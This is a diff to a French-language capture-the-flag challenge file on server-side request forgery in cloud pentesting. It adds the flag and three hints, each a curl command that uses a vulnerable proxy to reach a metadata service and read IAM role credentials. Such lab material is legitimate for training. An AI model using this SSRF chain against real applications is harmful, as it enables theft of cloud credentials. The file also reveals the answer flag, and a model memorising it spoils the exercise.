@@ -1,6 +1,15 @@
 {
   "name": "SSRF vers services internes",
   "description": "Vous avez identifié une application web vulnérable à une SSRF (Server-Side Request Forgery). Exploitez cette vulnérabilité pour interroger le service de métadonnées interne et récupérer les identifiants cloud.",
+  "track": "cloud-pentesting",
+  "module": "1.4",
+  "id": "1.4.3",
   "difficulty": "Medium",
-  "author": "PCE Root Labs"
+  "author": "PCE Root Labs",
+  "flag": "PCE{ssrf_m3t4d4t4_2026}",
+  "hints": [
+    "Testez le proxy SSRF vers le service interne : curl 'http://localhost:8000/proxy?url=http://127.0.0.1:8080/latest/meta-data/'",
+    "Naviguez vers les identifiants IAM via le proxy : curl 'http://localhost:8000/proxy?url=http://127.0.0.1:8080/latest/meta-data/iam/security-credentials/'",
+    "Récupérez les credentials du rôle ec2-role : curl 'http://localhost:8000/proxy?url=http://127.0.0.1:8080/latest/meta-data/iam/security-credentials/ec2-role' (le flag est dans le champ Token)"
+  ]
 }
